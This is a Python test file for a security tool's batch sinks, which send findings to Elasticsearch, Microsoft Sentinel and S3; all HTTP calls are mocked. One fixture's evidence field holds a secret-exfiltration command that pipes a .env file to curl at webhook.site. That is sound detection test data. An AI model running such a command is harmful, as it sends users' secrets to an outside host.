"""Tests for the batch sinks: elastic, sentinel, s3."""
import json
import urllib.request
from datetime import datetime, timezone

import pytest

from prismor.runtime import sinks


def _event(n=1):
    return sinks._build_event(
        {
            "severity": "HIGH",
            "category": "secret_exfiltration",
            "ruleId": "secret-exfiltration",
            "action": "block",
            "title": f"Secret file piped to network {n}",
            "evidence": ".env | curl webhook.site",
            "id": "sess_4f2a:finding-1",
        },
        extra={"agent": "claude"},
    )


class _Resp:
    def __init__(self, body=b""):
        self.body = body

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def read(self, *_):
        return self.body


@pytest.fixture
def calls(monkeypatch):
    seen = []

    def fake_urlopen(req, timeout=None):
        seen.append({
            "url": req.full_url,
            "method": req.get_method(),
            "headers": {k.lower(): v for k, v in req.header_items()},
            "data": req.data,
        })
        if "oauth2" in req.full_url:
            return _Resp(json.dumps({"access_token": "tok-1", "expires_in": 3600}).encode())
        return _Resp()

    monkeypatch.setattr(urllib.request, "urlopen", fake_urlopen)
    sinks._AZURE_TOKENS.clear()
    return seen


def test_registered():
    assert set(sinks._BATCH_DISPATCHERS) == {"elastic", "sentinel", "s3"}


def test_elastic_bulk(calls):
    sinks._dispatch_elastic({"url": "https://es.example:9200/", "api_key": "k1"}, [_event(1), _event(2)])
    (call,) = calls
    assert call["url"] == "https://es.example:9200/_bulk"
    assert call["headers"]["authorization"] == "ApiKey k1"
    lines = call["data"].decode().strip().split("\n")
    assert len(lines) == 4
    assert json.loads(lines[0]) == {"create": {"_index": "prismor-findings"}}
    doc = json.loads(lines[1])
    assert doc["class_uid"] == 2004 and doc["@timestamp"]


def test_elastic_basic_auth(calls):
    sinks._dispatch_elastic({"url": "http://es:9200", "username": "u", "password": "p"}, [_event()])
    assert calls[0]["headers"]["authorization"] == "Basic dTpw"


def test_sentinel_token_then_ingest_and_cache(calls):
    cfg = {"endpoint": "https://dce.ingest.monitor.azure.com", "dcr_id": "dcr-abc",
           "tenant_id": "t", "client_id": "c", "client_secret": "s"}
    sinks._dispatch_sentinel(cfg, [_event(1), _event(2)])
    sinks._dispatch_sentinel(cfg, [_event(3)])
    token_calls = [c for c in calls if "oauth2" in c["url"]]
    ingest = [c for c in calls if "dataCollectionRules" in c["url"]]
    assert len(token_calls) == 1  # cached for the second dispatch
    assert token_calls[0]["url"] == "https://login.microsoftonline.com/t/oauth2/v2.0/token"
    assert b"monitor.azure.com" in token_calls[0]["data"]
    assert ingest[0]["url"] == ("https://dce.ingest.monitor.azure.com/dataCollectionRules/dcr-abc"
                                "/streams/Custom-PrismorFindings_CL?api-version=2023-01-01")
    assert ingest[0]["headers"]["authorization"] == "Bearer tok-1"
    rows = json.loads(ingest[0]["data"])
    assert len(rows) == 2
    assert rows[0]["RuleId"] == "secret-exfiltration" and rows[0]["Agent"] == "claude"
    assert rows[0]["Ocsf"]["class_uid"] == 2004


def test_sentinel_without_credentials_raises(calls):
    with pytest.raises(ValueError):
        sinks._dispatch_sentinel({"endpoint": "https://x", "dcr_id": "d"}, [_event()])


def test_s3_put_is_signed_like_botocore(calls, monkeypatch):
    pytest.importorskip("botocore")
    import botocore.auth
    from botocore.auth import S3SigV4Auth
    from botocore.awsrequest import AWSRequest
    from botocore.credentials import Credentials

    fixed = datetime(2026, 11, 5, 12, 0, 0, tzinfo=timezone.utc)

    class _DT(datetime):
        @classmethod
        def now(cls, tz=None):
            return fixed

    monkeypatch.setattr(sinks, "datetime", _DT)
    monkeypatch.setenv("AWS_ACCESS_KEY_ID", "AKIDEXAMPLE")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY")
    monkeypatch.delenv("AWS_SESSION_TOKEN", raising=False)
    sinks._dispatch_s3({"bucket": "logs", "region": "us-east-1", "prefix": "agents/"}, [_event(1), _event(2)])
    (call,) = calls
    assert call["method"] == "PUT"
    assert call["url"].startswith("https://logs.s3.us-east-1.amazonaws.com/agents/2026/11/05/")
    assert call["url"].endswith(".ndjson")
    assert len(call["data"].decode().strip().split("\n")) == 2

    ref = AWSRequest(method="PUT", url=call["url"], data=call["data"],
                     headers={"x-amz-content-sha256": call["headers"]["x-amz-content-sha256"]})
    signer = S3SigV4Auth(Credentials("AKIDEXAMPLE", "wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY"), "s3", "us-east-1")
    monkeypatch.setattr(botocore.auth, "get_current_datetime", lambda: fixed.replace(tzinfo=None))
    signer.add_auth(ref)
    assert call["headers"]["authorization"] == ref.headers["Authorization"]


def test_s3_compatible_endpoint_is_path_style(calls, monkeypatch):
    monkeypatch.setenv("AWS_ACCESS_KEY_ID", "a")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "b")
    sinks._dispatch_s3({"bucket": "logs", "region": "auto", "endpoint": "http://minio:9000"}, [_event()])
    assert calls[0]["url"].startswith("http://minio:9000/logs/prismor/")


def test_dispatch_batches_once_and_never_raises(calls, capsys):
    findings = [{"severity": "HIGH", "title": "a"}, {"severity": "LOW", "title": "b"}]
    sinks.dispatch(findings, [{"type": "elastic", "url": "http://es:9200"},
                              {"type": "sentinel", "endpoint": "https://x", "dcr_id": "d"}])
    bulk = [c for c in calls if c["url"].endswith("/_bulk")]
    assert len(bulk) == 1 and bulk[0]["data"].decode().count("\n") == 4
    # sentinel misconfigured: warned by class name, no secret-bearing message
    assert "sink 'sentinel' failed: ValueError" in capsys.readouterr().err


def test_inventory_rows_reach_batch_sinks(calls):
    rows = [{"kind": "mcp_server", "name": "github", "entity_key": "mcp:github", "risk": {"level": "medium"}}]
    sinks.dispatch_inventory(rows, [{"type": "elastic", "url": "http://es:9200"}])
    doc = json.loads(calls[0]["data"].decode().split("\n")[1])
    assert doc["finding_info"]["title"] == "mcp_server:github"
